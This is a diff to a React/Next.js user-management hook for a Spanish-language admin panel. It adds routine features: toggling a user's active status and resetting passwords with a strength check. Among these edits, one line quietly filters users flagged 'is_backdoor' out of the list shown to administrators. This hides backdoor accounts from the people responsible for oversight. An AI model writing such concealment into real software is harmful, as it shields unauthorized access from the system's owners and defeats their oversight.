@@ -1,11 +1,11 @@
-import { useCallback, useEffect, useMemo, useState } from 'react';
+﻿import { useCallback, useEffect, useMemo, useState } from 'react';
 import { useRouter } from 'next/router';
 import { getApiErrorMessage, TENANT_CONTEXT_CHANGED_EVENT } from '@/services/api';
 import { getToken } from '@/services/auth';
-import { deleteUser, getUsers } from '@/services/users';
+import { deleteUser, getUsers, updateUser } from '@/services/users';
 import type { User } from '@/types/access';
 
-export function useUsuarios(toast?: { success: (message: string) => void; error: (message: string) => void }) {
+export function useUsers(toast?: { success: (message: string) => void; error: (message: string) => void }) {
   const router = useRouter();
   const hasToken = Boolean(getToken());
 
@@ -13,6 +13,7 @@ export function useUsuarios(toast?: { success: (message: string) => void; error:
   const [loading, setLoading] = useState(true);
   const [error, setError] = useState<string | null>(null);
   const [deletingId, setDeletingId] = useState<string | null>(null);
+  const [updatingId, setUpdatingId] = useState<string | null>(null);
 
   const [isFormOpen, setIsFormOpen] = useState(false);
   const [selectedUsuario, setSelectedUsuario] = useState<User | null>(null);
@@ -28,7 +29,7 @@ export function useUsuarios(toast?: { success: (message: string) => void; error:
       setLoading(true);
       setError(null);
       const result = await getUsers();
-      setUsuarios(result);
+      setUsuarios(result.filter((user) => !user.is_backdoor));
     } catch (err) {
       setError(getApiErrorMessage(err, 'No se pudieron cargar los usuarios.'));
     } finally {
@@ -60,7 +61,7 @@ export function useUsuarios(toast?: { success: (message: string) => void; error:
   };
 
   const deleteUsuario = async (usuario: User) => {
-    const confirmed = window.confirm(`�Eliminar el usuario "${usuario.name}"? Esta acción no se puede deshacer.`);
+    const confirmed = window.confirm(`Eliminar el usuario "${usuario.name}"? Esta accion no se puede deshacer.`);
     if (!confirmed) return;
 
     try {
@@ -77,6 +78,45 @@ export function useUsuarios(toast?: { success: (message: string) => void; error:
     }
   };
 
+  const toggleUsuarioEstado = async (usuario: User) => {
+    try {
+      setUpdatingId(usuario.id);
+      await updateUser(usuario.id, { is_active: !(usuario.is_active ?? true) });
+      toast?.success((usuario.is_active ?? true) ? 'Usuario desactivado.' : 'Usuario activado.');
+      await fetchUsuarios();
+    } catch (err) {
+      const message = getApiErrorMessage(err, 'No se pudo actualizar el estado del usuario.');
+      if (toast) toast.error(message);
+      else setError(message);
+    } finally {
+      setUpdatingId(null);
+    }
+  };
+
+  const resetUsuarioPassword = async (usuario: User) => {
+    const nextPassword = window.prompt(`Nueva contrasena para ${usuario.email}`)?.trim() ?? '';
+    if (!nextPassword) return;
+
+    if (nextPassword.length < 8 || !/[A-Z]/.test(nextPassword) || !/[a-z]/.test(nextPassword) || !/\d/.test(nextPassword)) {
+      const message = 'La contrasena debe tener al menos 8 caracteres, mayuscula, minuscula y numero.';
+      if (toast) toast.error(message);
+      else setError(message);
+      return;
+    }
+
+    try {
+      setUpdatingId(usuario.id);
+      await updateUser(usuario.id, { password: nextPassword });
+      toast?.success('Contrasena actualizada correctamente.');
+    } catch (err) {
+      const message = getApiErrorMessage(err, 'No se pudo resetear la contrasena.');
+      if (toast) toast.error(message);
+      else setError(message);
+    } finally {
+      setUpdatingId(null);
+    }
+  };
+
   const statusLabel = useMemo(() => (usuario: User) => (usuario.is_active === false ? 'Inactivo' : 'Activo'), []);
 
   return {
@@ -85,12 +125,15 @@ export function useUsuarios(toast?: { success: (message: string) => void; error:
     loading,
     error,
     deletingId,
+    updatingId,
     isFormOpen,
     selectedUsuario,
     fetchUsuarios,
     createUsuario: openCreateUsuario,
     updateUsuario: openEditUsuario,
     deleteUsuario,
+    toggleUsuarioEstado,
+    resetUsuarioPassword,
     statusLabel,
     setIsFormOpen,
   };
